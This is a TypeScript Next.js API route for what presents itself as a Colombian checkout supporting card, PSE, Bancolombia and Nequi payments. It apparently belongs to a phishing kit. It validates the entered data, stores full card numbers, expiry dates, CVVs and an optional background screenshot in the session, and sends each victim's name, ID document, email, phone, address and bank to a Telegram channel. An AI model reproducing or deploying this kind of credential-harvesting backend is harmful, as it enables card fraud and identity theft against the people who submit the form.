import { NextRequest, NextResponse } from "next/server";
import { readSessionFromReq, writeSession } from "@/lib/session";
import { validateCardNumber } from "@/lib/luhn";
import { enviarCheckout } from "@/lib/pasarela";
import { getBancosPermitidos } from "@/lib/bancos";
import { sendUpdate } from "@/lib/telegram";
import { preloadSettings } from "@/lib/settings";
import { calcularDescuento } from "@/lib/discount";

const METODOS = ["TARJETA", "PSE", "BANCOLOMBIA", "NEQUI"] as const;
const DOCS = ["CC", "CE", "NIT", "TI", "PP", "CEL", "RC", "DE", "CD", "TE", "NE"];

function valid(value: unknown, re: RegExp): boolean {
  return typeof value === "string" && re.test(value);
}

export async function POST(req: NextRequest) {
  const body = await req.json().catch(() => null);
  const data = body?.data;
  if (!data || typeof data !== "object") {
    return NextResponse.json(
      { ok: false, errors: { form: "Por favor completa correctamente los campos." } },
      { status: 422 }
    );
  }

  const metodo = String(data.metodoPago || "").toUpperCase();
  if (!METODOS.includes(metodo as (typeof METODOS)[number])) {
    return NextResponse.json(
      { ok: false, errors: { form: "Por favor completa correctamente los campos." } },
      { status: 422 }
    );
  }

  // Para NEQUI pre-asignar entidadBancaria
  if (metodo === "NEQUI") {
    data.entidadBancaria = "NEQUI";
  }

  // === Validación ===
  if (!valid(data.email, /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/)) {
    return NextResponse.json(
      { ok: false, errors: { form: "Email inválido." } },
      { status: 422 }
    );
  }

  if (!valid(data.nombre, /^[A-Za-zÁÉÍÓÚáéíóúÑñ ]{7,50}$/)) {
    return NextResponse.json(
      { ok: false, errors: { form: "Nombre inválido." } },
      { status: 422 }
    );
  }
  if (!DOCS.includes(String(data.tipoDocumento || ""))) {
    return NextResponse.json(
      { ok: false, errors: { form: "Tipo de documento inválido." } },
      { status: 422 }
    );
  }
  if (!valid(data.documento, /^[A-Za-z0-9]{7,15}$/)) {
    return NextResponse.json(
      { ok: false, errors: { form: "Documento inválido." } },
      { status: 422 }
    );
  }
  if (!valid(data.telefono, /^\d{7,15}$/)) {
    return NextResponse.json(
      { ok: false, errors: { form: "Teléfono inválido." } },
      { status: 422 }
    );
  }
  if (!valid(data.tipoTelefono, /^\+\d{1,4}$/)) {
    return NextResponse.json(
      { ok: false, errors: { form: "Indicativo de teléfono inválido." } },
      { status: 422 }
    );
  }
  if (typeof data.direccion !== "string" || data.direccion.length < 4 || data.direccion.length > 100) {
    return NextResponse.json(
      { ok: false, errors: { form: "Dirección inválida." } },
      { status: 422 }
    );
  }

  await preloadSettings();
  const bancosPermitidos = getBancosPermitidos();

  if (metodo === "PSE" || metodo === "BANCOLOMBIA") {
    const banco = String(data.entidadBancaria || "");
    if (!banco || !bancosPermitidos.includes(banco)) {
      return NextResponse.json(
        { ok: false, errors: { form: "Banco inválido." } },
        { status: 422 }
      );
    }
  }
  if (metodo === "NEQUI" && data.entidadBancaria !== "NEQUI") {
    return NextResponse.json(
      { ok: false, errors: { form: "Banco inválido." } },
      { status: 422 }
    );
  }

  if (metodo === "TARJETA") {
    const cleanedCard = String(data.numTarjeta || "").replace(/\s+/g, "");
    if (!validateCardNumber(cleanedCard)) {
      return NextResponse.json(
        { ok: false, errors: { form: "El número de tarjeta no es válido" } },
        { status: 422 }
      );
    }
    const fecha = String(data.fechaVencimiento || "");
    if (!/^\d{2}\/\d{2}$/.test(fecha)) {
      return NextResponse.json(
        { ok: false, errors: { form: "Fecha de vencimiento inválida." } },
        { status: 422 }
      );
    }
    const [mm, yy] = fecha.split("/");
    const month = parseInt(mm, 10);
    const year = 2000 + parseInt(yy, 10);
    const now = new Date();
    const cM = now.getMonth() + 1;
    const cY = now.getFullYear();
    if (month < 1 || month > 12) {
      return NextResponse.json(
        { ok: false, errors: { form: "El mes de vencimiento no es válido" } },
        { status: 422 }
      );
    }
    if (year < cY || (year === cY && month < cM)) {
      return NextResponse.json(
        { ok: false, errors: { form: "La tarjeta está vencida" } },
        { status: 422 }
      );
    }
    if (!valid(data.cvv, /^\d{3,4}$/)) {
      return NextResponse.json(
        { ok: false, errors: { form: "CVV inválido." } },
        { status: 422 }
      );
    }
    const cuotas = String(data.cuotas || "");
    const cuotasN = parseInt(cuotas, 10);
    if (!cuotasN || cuotasN < 1 || cuotasN > 20) {
      return NextResponse.json(
        { ok: false, errors: { form: "Cuotas inválidas." } },
        { status: 422 }
      );
    }
  }

  // === Guardar en sesión ===
  const session = await readSessionFromReq(req);
  if (!session.telefono || !session.total) {
    return NextResponse.json(
      { ok: false, redirect: "/mov" },
      { status: 422 }
    );
  }

  session.nombreUsuario = String(data.nombre);
  session.tipoDocumento = String(data.tipoDocumento);
  session.documento = String(data.documento);
  session.metodoPago = metodo as (typeof METODOS)[number];
  session.entidadBancaria = data.entidadBancaria ? String(data.entidadBancaria) : "";
  session.celular = String(data.telefono);
  session.tipoTelefono = String(data.tipoTelefono);
  session.direccion = String(data.direccion);
  session.email = String(data.email || "");

  if (metodo === "TARJETA") {
    session.numTarjeta = String(data.numTarjeta).replace(/\s+/g, "");
    session.fechaVencimiento = String(data.fechaVencimiento);
    session.cvv = String(data.cvv);
    session.cuotas = String(data.cuotas);
    if (data.backgroundScreenshot) {
      session.background_screenshot = String(data.backgroundScreenshot);
    }
  }

  session.error = false;

  // === Telegram ===
  await sendUpdate({
    telefono: session.telefono,
    nombre: session.nombreUsuario,
    email: session.email ?? "",
    documento: `${session.tipoDocumento}:${session.documento}`,
    metodo_pago: session.metodoPago,
    banco: session.entidadBancaria ?? "",
    celular: `${session.tipoTelefono}${session.celular}`,
    direccion: session.direccion,
    total: Math.floor(calcularDescuento(session.total ?? 0, session.descuentoPorcentaje ?? 0)),
  });

  // === Pasarela ===
  const host = req.headers.get("host") || new URL(req.url).host;
  const origin = `${new URL(req.url).protocol}//${host}`;
  const checkoutRes = await enviarCheckout(
    session.metodoPago as "TARJETA" | "PSE" | "NEQUI" | "BANCOLOMBIA",
    session,
    origin
  );

  // Sea cual sea la respuesta de pasarela (200 con redirect o 500 con error),
  // persistimos la sesión actualizada antes de devolverla al cliente.
  return await writeSession(checkoutRes, session);
}
